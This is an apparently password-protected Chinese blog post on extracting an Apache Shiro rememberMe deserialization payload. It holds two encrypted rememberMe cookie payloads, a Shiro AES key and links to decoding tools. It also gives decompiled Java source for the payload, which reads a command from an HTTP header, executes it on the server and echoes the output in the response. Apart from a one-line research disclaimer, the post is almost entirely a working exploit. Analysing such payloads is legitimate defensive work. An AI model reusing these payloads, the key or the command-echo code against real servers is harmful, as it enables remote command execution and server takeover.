---

title: Shiro Payload EXP提取
password: 132456
abstract: 该文章已受密码保护, 请您输入密码查看。
message: 该文章已受密码保护, 请您输入密码查看。
wrong_pass_message: 密码不正确，请重新输入！
wrong_hash_message: 文章不能被校验, 不过您还是能看看解密后的内容！
tags: JAVA
typora-root-url: ../
date: 2020-09-12 09:32:58
---

本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。

<div style="text-align: right"> 小维</div>

#### 概述



#### payload

```
rememberMe=H9D0QtzVR5iLEiVWOqnP/h24Du1YJU95n/tavLpST0clXdQvcbXRSEtL9vnaIvlCd0Y7VFlx77lhIlr2+52vTJUeOPoELV1RD6PIe805MmZKWrT2QhAizQOgEV53vdP9ZvCnDf4mSu97M8LqT6jVGlH8IIXnZyWRuUOPufepC2BCdfmckx3jjApWyNM4SoWlr4M+zoci04FUXy40Un4YJ/kKCGSCWjLtqPW2+LUU9XqyRLbrxBap9uWCz/PLm1vefh+/oTxYQ03dh9bFeWQeGDnJFHtMeKLNU6iQN3NkHwJFFiMLCUkvUfchoxDR2GpBIUItFO25UirWDMrgF/YaE5Ztzdg3pxItQTDQzLWC7vgrsmWtnbPKqoP+4ywXkGF0Ix+YiaTzYzwWZxEFuRqADSbQ+66Xtc3z3zFNvVP+DvznJuL7XifknfJu2fWH6r67hc4cfeO25c3L9AIEl5mCKuKSXM8ecbQpv1YUowldbc14cYPzudu0xUne8sJBGIZPyeq/uAQX3wwkXxLtQblmpsWxKyg5HM2TaVPgSVuMU6zS7zJ9SJCWj87zoJ2ymSR68uqAGcSl/s+NmwjiQJIWIgdbvyR83aVAFHwknPOYRfUs9jDy5F0F5r9bGQ7zjuDDUWoHRKtGz074daOPEeYidT544nJtUar4XU/jX3LCV37UgaLwoX79Bf1K0PjwEoV3Xw01sNjWAqVfzx6MrnjFK5NywuQsg2a7WUdJAh2ySi6/+6sRIIR32czE0XE8ft1V0ICszFnqlxhe1O8e35f1D94uv9qepGNCLSELWz7HtUuUE3zFs5ZfFEemZ7hJrw/TrGzbcfOsIMdVo4oah36Y9d9aVs5sHpyJ6g+rlozZabf4cIJJPj7tg4giCxh3irTGNpA9/SswFdNWb+S8EfBgdNIDuODkrSBwu92Bd3I5e2h/qzsmJQuNMwAqBMMEzGhV8N40bbYJzCN/LLwzCzOBlWfrspY6J1dc0Vd/IjWrqSvcFg7Fhgwcp6/k9BA+qQmbgHC2iqCWWOPZb4CA06zVAMiSMniEimw/H0q2VRkZ8j2NmGN98SEtdVcEC2vFfHLggy1CetJYZzI1LsYFy9TgXu2es5pmlmKBuiUe6c/ks7dwj2nF+cqd4b2Qj5cqTxwiGb4JDmocphXhOA4j8hrQR8wywSxXvetsQRMhK99k3uSDLKcJY/fTcm688avPjU3BcV5U+ElkLR5CkLIY1F6R8t/A0KmjwkuqKiHcwCcPro5ffpmBt9eTPt66W836aqw1ChRCNrgXhtqDQ1vPFM7kmTxOuqbs9KSYrZvaWjSQZJS7QHm+KoZ9JOn0rxoFIo8yc+p0k0H3qfBnX88wrsMwkgGv/apP0XVAfek1kBw8L23rH3+KjtchjpcXwUpAiTC72FdwX59Aicf0UCZi3sFsVU9foozkj1l9naSFNMnDeWsBhOUCU4l7cTkbLCCTrxwr
```

```
Cookie: oms.sesssion=a848cd42-d5bc-4f85-a802-4de7386d8b38;rememberMe=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
```



```
AES_key:fCq+/xW488hMTCD+cmJ3aQ==
```



#### 解密

https://github.com/Wh0ale/SHIRO_Rememberme_decode

https://github.com/NickstaDB/SerializationDumper

#### 源代码

```
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.InputStream;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Scanner;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;

public class 1594097594766310000 extends AbstractTranslet {
    static {
        Object var1 = null;
        String var2 = Thread.currentThread().getContextClassLoader().getResource("").getPath();
        var2 = var2.substring(0, var2.indexOf("WEB-INF"));
        HttpServletRequest var3 = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getRequest();
        String var4 = var3.getHeader("ShimizuCMD");
        boolean var5 = true;
        ArrayList var6 = new ArrayList();
        String var7 = System.getProperty("os.name");
        if (var7 != null && var7.toLowerCase().contains("win")) {
            var5 = false;
        }

        if (var4 == null || var4.trim().length() == 0) {
            var4 = "whoami";
        }

        if (var4.startsWith("$NO$")) {
            var6.add(var4.substring(4));
        } else if (var5) {
            var6.add("/bin/bash");
            var6.add("-c");
            var6.add(var4);
        } else {
            var6.add("cmd.exe");
            var6.add("/c");
            var6.add(var4);
        }

        InputStream var8 = Runtime.getRuntime().exec(var4).getInputStream();
        Scanner var9 = (new Scanner(var8)).useDelimiter("\\a");
        String var10 = var9.hasNext() ? var9.next() : "";
        HttpServletResponse var11 = ((ServletRequestAttributes)RequestContextHolder.getRequestAttributes()).getResponse();
        PrintWriter var12 = new PrintWriter(var11.getOutputStream());
        String var13 = "\n\nWebPath:" + var2 + "\n" + "\n" + var4 + ": " + "\n" + var10;
        var12.write(var13);
        var12.flush();
        var12.close();
    }

    public _594097594766310000/* $FF was: 1594097594766310000*/() {
    }
}

```

